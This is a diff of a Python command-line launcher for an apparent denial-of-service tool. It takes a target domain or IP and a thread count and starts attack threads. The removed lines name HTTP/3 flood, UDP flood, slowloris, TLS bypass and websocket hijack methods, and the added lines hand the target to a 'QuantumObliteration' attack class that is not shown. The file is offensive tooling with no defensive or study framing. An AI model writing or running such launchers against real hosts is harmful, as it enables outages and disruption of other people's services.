@@ -1,42 +1,33 @@
-import threading
 import sys
 import time
-from hyperbypass import QuantumDestruction
+import threading
+from bypass import QuantumObliteration
 
 def attack(target, threads, attack_type):
-    attack_instance = QuantumDestruction(target, attack_type)
-
-    for _ in range(threads):
-        threading.Thread(target=attack_instance.http3_flood).start()
-        threading.Thread(target=attack_instance.tls_bypass).start()
-        threading.Thread(target=attack_instance.websocket_hijack).start()
-        threading.Thread(target=attack_instance.udp_apocalypse).start()
-        threading.Thread(target=attack_instance.slowloris_stealth).start()
-        threading.Thread(target=attack_instance.quantum_ai_adapt).start()
+    print(f"[*] Starting attack on {target} with {threads} threads...\n")
+    attack_instance = QuantumObliteration(target, attack_type)
+    attack_instance.attack(threads)
 
 def main():
     if len(sys.argv) < 3:
         print("\nUsage:")
-        print("  python main.py <target> <threads>")
-        print("  python main.py -a <domain> <threads>")
-        print("  python main.py -ip <IP> <threads>\n")
+        print("python main.py <target> <threads>")
+        print("python main.py -ip <IP Address> <threads>")
+        print("python main.py -a <target> <threads>\n")
         sys.exit(1)
 
-    if sys.argv[1] == "-a":
-        target = sys.argv[2]
-        attack_type = "HTTP"
-        threads = int(sys.argv[3])
-    elif sys.argv[1] == "-ip":
+    if sys.argv[1] == "-ip":
         target = sys.argv[2]
         attack_type = "IP"
-        threads = int(sys.argv[3])
+    elif sys.argv[1] == "-a":
+        target = sys.argv[2]
+        attack_type = "DOMAIN"
     else:
         target = sys.argv[1]
-        attack_type = "HTTP"
-        threads = int(sys.argv[2])
+        attack_type = "DOMAIN"
 
-    print(f"[*] Starting attack on {target} with {threads} threads...")
-    time.sleep(1)
+    threads = int(sys.argv[3]) if sys.argv[1] in ["-ip", "-a"] else int(sys.argv[2])
+
     attack(target, threads, attack_type)
 
 if __name__ == "__main__":
